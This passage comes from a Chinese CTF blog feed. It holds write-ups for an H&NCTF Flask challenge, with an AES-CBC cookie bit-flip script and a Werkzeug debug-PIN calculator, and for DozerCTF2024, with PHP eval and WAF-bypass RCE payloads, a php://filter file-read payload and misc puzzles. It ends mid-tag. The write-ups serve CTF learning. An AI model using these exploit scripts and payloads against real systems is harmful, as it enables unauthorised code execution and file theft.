class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, abort<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Random <span class="hljs-keyword">import</span> get_random_bytes<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad, unpad<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, Response<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode, b64decode<br><br><span class="hljs-keyword">import</span> json<br><br>default_session = <span class="hljs-string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;&#x27;</span><br>key = get_random_bytes(AES.block_size)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">session</span>):<br>    iv = get_random_bytes(AES.block_size)<br>    cipher = AES.new(key, AES.MODE_CBC, iv)<br>    <span class="hljs-keyword">return</span> b64encode(iv + cipher.encrypt(pad(session.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), AES.block_size)))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">session</span>):<br>    raw = b64decode(session)<br>    cipher = AES.new(key, AES.MODE_CBC, raw[:AES.block_size])<br>    <span class="hljs-keyword">try</span>:<br>        res = unpad(cipher.decrypt(raw[AES.block_size:]), AES.block_size).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br><br>app = Flask(__name__)<br><br>filename_blacklist = &#123;<br>    <span class="hljs-string">&#x27;self&#x27;</span>,<br>    <span class="hljs-string">&#x27;cgroup&#x27;</span>,<br>    <span class="hljs-string">&#x27;mountinfo&#x27;</span>,<br>    <span class="hljs-string">&#x27;env&#x27;</span>,<br>    <span class="hljs-string">&#x27;flag&#x27;</span><br>&#125;<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    session = request.cookies.get(<span class="hljs-string">&#x27;session&#x27;</span>)<br>    <span class="hljs-keyword">if</span> session <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        res = Response(<br>            <span class="hljs-string">&quot;welcome to the FlipPIN server try request /hint to get the hint&quot;</span>)<br>        res.set_cookie(<span class="hljs-string">&#x27;session&#x27;</span>, encrypt(default_session).decode())<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;have a fun&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/hint&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hint</span>():<br>    res = Response(<span class="hljs-built_in">open</span>(__file__).read(), mimetype=<span class="hljs-string">&#x27;text/plain&#x27;</span>)<br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/read&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">file</span>():<br><br>    session = request.cookies.get(<span class="hljs-string">&#x27;session&#x27;</span>)<br>    <span class="hljs-keyword">if</span> session <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        res = Response(<span class="hljs-string">&quot;you are not logged in&quot;</span>)<br>        res.set_cookie(<span class="hljs-string">&#x27;session&#x27;</span>, encrypt(default_session))<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">else</span>:<br>        plain_session = decrypt(session)<br>        <span class="hljs-keyword">if</span> plain_session <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;don\&#x27;t hack me&#x27;</span><br><br>        session_data = json.loads(plain_session)<br><br>        <span class="hljs-keyword">if</span> session_data[<span class="hljs-string">&#x27;admin&#x27;</span>] :<br>            filename = request.args.get(<span class="hljs-string">&#x27;filename&#x27;</span>)<br><br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(blacklist_str <span class="hljs-keyword">in</span> filename <span class="hljs-keyword">for</span> blacklist_str <span class="hljs-keyword">in</span> filename_blacklist):<br>                abort(<span class="hljs-number">403</span>, description=<span class="hljs-string">&#x27;Access to this file is forbidden.&#x27;</span>)<br><br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                    <span class="hljs-keyword">return</span> f.read()<br>            <span class="hljs-keyword">except</span> FileNotFoundError:<br>                abort(<span class="hljs-number">404</span>, description=<span class="hljs-string">&#x27;File not found.&#x27;</span>)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                abort(<span class="hljs-number">500</span>, description=<span class="hljs-string">f&#x27;An error occurred: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;You are not an administrator&#x27;</span><br><br><br><br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">9091</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>先审计一下代码</p><p><img src="/../images/H&NCTF/flipPin.png" alt="flipPin"></p><p>是AES-CBC字节反转攻击，</p><p>该方面的信息也是不太懂，搜索了一下内容如下</p><p>Flask在debug模式下会生成一个Debugger PIN，而且如果你多次重启Flask服务，PIN码值不改变。</p><p>通常情况下，对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在**&#x2F;etc&#x2F;machine-id<strong>或</strong>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id**，有的系统没有这两个文件，windows的id获取跟linux也不同。<br>对于docker机则读取&#x2F;proc&#x2F;self&#x2F;cgroup：</p><p>也是借用一下师傅的代码吧，我自己也不会写（之后准备系统学一下相关知识</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode, b64encode<br><br>url = <span class="hljs-string">&quot;http://hnctf.imxbt.cn:34024/&quot;</span><br>default_session = <span class="hljs-string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;&#x27;</span><span class="hljs-comment">#源代码给的非管理员用户信息</span><br>res = requests.get(url)<span class="hljs-comment">#发送了一个 GET 请求到目标网站，用于获取一个默认的加密会话。</span><br>c = <span class="hljs-built_in">bytearray</span>(b64decode(res.cookies[<span class="hljs-string">&quot;session&quot;</span>]))<br>c[default_session.index(<span class="hljs-string">&quot;0&quot;</span>)] ^= <span class="hljs-number">1</span><span class="hljs-comment">#session从0改为1</span><br>evil = b64encode(c).decode()<br><br>res = requests.get(url+<span class="hljs-string">f&quot;read?filename=/proc/sys/kernel/random/boot_id&quot;</span>, cookies=&#123;<span class="hljs-string">&quot;session&quot;</span>: evil&#125;)<br><span class="hljs-comment">#</span><br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sha1</span><br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;ctfUser&#x27;</span><span class="hljs-comment"># /etc/passwd</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,<span class="hljs-comment"># 默认值</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,<span class="hljs-comment"># 默认值</span><br>    <span class="hljs-string">&#x27;/usr/lib/python3.9/site-packages/flask/app.py&#x27;</span> <span class="hljs-comment"># 报错得到</span><br>]<br><br>private_bits = [<br>    <span class="hljs-string">&#x27;226622582027708&#x27;</span>,<span class="hljs-comment">#  /sys/class/net/eth0/address 16进制转10进制</span><br>    <span class="hljs-comment">#machine_id由两个合并(docker就后两个)：1./proc/sys/kernel/random/boot_id      2./proc/self/cgroup 由于cgroup和mountinfo被禁用,则用/proc/1/cpuset代替读取</span><br>    <span class="hljs-string">&#x27;dd0fe358-1d2b-4bb4-90d1-5fee6bcf533f&#x27;</span>+<span class="hljs-string">&#x27;51b9b7cd533a81e6baec0204f59b346b6558a68bed89cfda595ad4a35cc46a39&#x27;</span><span class="hljs-comment">#  /proc/sys/kernel/random/boot_id + /proc/1/cpuset</span><br>]<br><br>h = hashlib.sha1()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br><br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br><br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br><br>rv =<span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><br><span class="hljs-built_in">print</span>(rv)<br></code></pre></td></tr></table></figure><p>得到pin，在console里面输入pin</p><p><img src="/../images/H&NCTF/console.png" alt="console"></p><p>大部分都是借鉴的，之后会系统的学一下。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DozerCTF2024</title>
    <link href="/2024/04/28/Dozerctf/Dozerctf2024/"/>
    <url>/2024/04/28/Dozerctf/Dozerctf2024/</url>
    
    <content type="html"><![CDATA[<p>前言：历时一天，最后拿到了团队第八，以下是团队的wp.</p><h1 id="web-and-misc"><a href="#web-and-misc" class="headerlink" title="web and misc"></a>web and misc</h1><h2 id="easy-rce"><a href="#easy-rce" class="headerlink" title="easy_rce"></a>easy_rce</h2><p>先上源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-comment"># 简简单单签个到吧</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$poc</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$blacklist</span> = <span class="hljs-string">&quot;/[0-9]|get_defined_vars|include|readfile|crypt|require|file_get_contents|readgzfile|highlight_file|show|session|getallheaders|next|prev|end|array_reverse|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$blacklist</span>, <span class="hljs-variable">$poc</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;die!&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;dieeeeeeee&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$poc</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>真狠啊，上面把能禁的都禁了，要不然还是挺简单了，想到之前ctfshow里面可以用scandir看看有什么的。尝试构造一下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>())));<br></code></pre></td></tr></table></figure><p>试了一下好像不能用.&#x2F;来找,说一下localeconv()</p><p>localeconv() 函数是一个编程语言函数，返回包含本地数字及货币信息格式的数组。这里可以通过这个函数读取当前目录下的文件名称。</p><p><img src="/../../images/dozerctf2024/rce.png" alt="rce"></p><p>可以知道flag就应该在fllllaaag.php，尝试直接得，</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">Parse error: syntax error, unexpected &#x27;&#123;&#x27; in /var/www/html/fllllaaag.php on line 3<br></code></pre></td></tr></table></figure><p>哎被禁了。那想想其他方法吧。</p><p>还是队友思路好啊我就是大菜狗，再讲一个函数array_flip()</p><p>array_flip () 函数用来交换数组中元素的键和值。array_flip() 返回一个反转后的 array，例如 array 中的键名变成了值，而 array 中的值成了键名。</p><p>简单的说就是下标和内容颠倒，就这么理解。</p><p>array_rand()</p><p>在不改变数组的基础上，从数组中随机的选取一个或多个元素，比如我们在网页上随机显示不同的广告，或者推荐不同的文章等等</p><p>又因为include那些被禁了，（劳累.jpg，也是靠队友，用file就行了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>()))))));<br></code></pre></td></tr></table></figure><p><img src="/../../images/dozerctf2024/rce1.png" alt="rce1"></p><h2 id="very-long-access"><a href="#very-long-access" class="headerlink" title="very_long_access"></a>very_long_access</h2><p>下载下来简要看一下内容吧，问了一下gpt,回答如下：</p><p>这看起来像是一个网络服务器的日志条目。它包括了一个时间戳、用户代理字符串（表明是运行在 Windows 10 上的 Chrome 版本 108.0.0.0 浏览器），以及一个对资源”A”的GET请求，请求的数据大小为34760字节。有什么关于这个日志条目你想要了解或讨论的吗？</p><p>感觉和wireshark的题目有点像，和时间有关系，发现时间并不是按顺序写的，撸个脚本排一下序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 读取日志文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;very_long_access.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    log_entries = file.readlines()<br><br><span class="hljs-comment"># 将日志条目解析为元组列表，每个元组包含时间戳和原始日志条目</span><br>parsed_entries = []<br><span class="hljs-keyword">for</span> entry <span class="hljs-keyword">in</span> log_entries:<br>    timestamp_string = entry.split(<span class="hljs-string">&quot; - &quot;</span>)[<span class="hljs-number">0</span>]<br>    parsed_entry = (timestamp_string, entry)<br>    parsed_entries.append(parsed_entry)<br><br><span class="hljs-comment"># 按时间先后顺序排序日志条目</span><br>sorted_entries = <span class="hljs-built_in">sorted</span>(parsed_entries, key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-number">0</span>])<br><br><span class="hljs-comment"># 写入排序后的日志条目到新文件中</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;sorted_access_logs.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    <span class="hljs-keyword">for</span> entry <span class="hljs-keyword">in</span> sorted_entries:<br>        file.write(entry[<span class="hljs-number">1</span>])<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;日志条目已按时间先后顺序排列并保存到 sorted_access_logs.txt 文件中。&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>排完看后面估计要把get&#x2F;后面的提出来才能有些头绪，再撸个脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 打开文件 very_long_access.txt 以读取模式</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;sorted_access_logs.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-comment"># 创建一个空列表，用于存储每行的数据</span><br>    lines = []<br>    <span class="hljs-comment"># 逐行读取文件内容</span><br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>        <span class="hljs-comment"># 找到每行中 &quot;GET /&quot; 后面的内容，并添加到列表中</span><br>        start_index = line.find(<span class="hljs-string">&quot;GET /&quot;</span>) + <span class="hljs-number">5</span><br>        end_index = line.find(<span class="hljs-string">&quot; &quot;</span>, start_index)<br>        request = line[start_index:end_index]<br>        lines.append(request)<br><br><span class="hljs-comment"># 将提取到的数据拼接成一行</span><br>get_requests = <span class="hljs-string">&#x27;&#x27;</span>.join(lines)<br><br><span class="hljs-comment"># 将拼接后的数据写入到新的文件 get_requests.txt 中</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;get_requests.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(get_requests)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;提取并写入完成！&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>ctrl+f搜看看有没有惊喜，确实有</p><p><img src="/../../images/dozerctf2024/access.png" alt="access"></p><h2 id="serialize"><a href="#serialize" class="headerlink" title="serialize"></a>serialize</h2><p>上面一个可以输入，下面一个好像偏rce,尝试输入了一会并没有得到答案。我试了一下robots.txt，出来了一个dozer_f1ag.php,直接开开不了，那就代码审计一下吧。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-string">&#x27;/var/www/html:/tmp&#x27;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;function.php&#x27;</span>;<br><span class="hljs-variable">$func</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;function&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;function&#x27;</span>]:<span class="hljs-string">&#x27;filters&#x27;</span>;<br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$_GET</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">&#x27;function.php&#x27;</span>) === <span class="hljs-literal">false</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;去找fun吧！！！&#x27;</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>ini_set,规定了访问路径在这两个里面。</p><p>给file赋值</p><p>然后检查URL查询字符串（$_GET）中是否设置了’function’参数。如果’function’参数已设置，则将其值赋给变量$func；否则，将字符串’filters’赋给$func。</p><p>call_user_func这个函数前阵子刚碰过，试过几次觉得应该是用extract解决。该函数用于将数组中的键名作为变量名，键值作为变量值，导入到当前符号表中。</p><p>strpos用于检测有没有，有才可以include,应该是用伪协议,覆盖</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file=php:<span class="hljs-comment">//filter/convert.base64-encode/resource=dozer_f1ag.php</span><br></code></pre></td></tr></table></figure><p>可是要有function.php,再改一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file=php:<span class="hljs-comment">//filter/function.php/convert.base64-encode/resource=dozer_f1ag.php</span><br></code></pre></td></tr></table></figure><p>最后构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span>=<span class="hljs-title">extract</span>&amp;<span class="hljs-title">file</span>=<span class="hljs-title">php</span>://<span class="hljs-title">filter</span>/<span class="hljs-title">function</span>.<span class="hljs-title">php</span>/<span class="hljs-title">convert</span>.<span class="hljs-title">base64</span>-<span class="hljs-title">encode</span>/<span class="hljs-title">resource</span>=<span class="hljs-title">dozer_f1ag</span>.<span class="hljs-title">php</span></span><br></code></pre></td></tr></table></figure><p>解一下base64<img src="/../../images/dozerctf2024/ser.png" alt="ser"></p><h2 id="上春山"><a href="#上春山" class="headerlink" title="上春山"></a>上春山</h2><p>二月天杨柳醉春烟..搞错了，看题目。</p><p>什么玩意，我自己整理了一下<img src="/../../images/dozerctf2024/%E4%B8%8A%E6%98%A5%E5%B1%B1.png" alt="上春山"></p><p>分析一下，一开始对暗号，然后聊天说东方有沉船搞个门路赚钱，最后flag应该和沉船有关系。说到这就应该好好拷打出题人了</p><p>官方给了提示不一定在国内，出名的奢侈的。</p><p>我们锁定范围(1911-1949年，出名，国外，奢侈，沉船)</p><p>这不就是出名的泰坦尼克号嘛，最后官方说的知道船可以问，直接给我一串汉字，我们谦虚一下，面向答案的wp写一下。</p><p>载柳度载汪分中中申申秒载爱度中申分载中句月秒</p><p>根据江湖黑话，上面的应该都是数字转化而来的，也就是当时沉船的经纬度转黑话，黑话再转MD5就行，最后就是flag.(好好拷打出题人)</p><h2 id="se"><a href="#se" class="headerlink" title="se"></a>se</h2><p>wav的题目，一般都挺简单的吧</p><p>听一下类似电话拨号的声音，网上的网站一把梭</p><p><img src="/../../images/dozerctf2024/se.png" alt="se"></p><p>962764453，卡壳了不知道接下来怎么写，emmmmm</p><p>还好有万能的队友，用silenteye可以提出zip，再用这个密码就可以得到flag了。</p><h2 id="shuiyin"><a href="#shuiyin" class="headerlink" 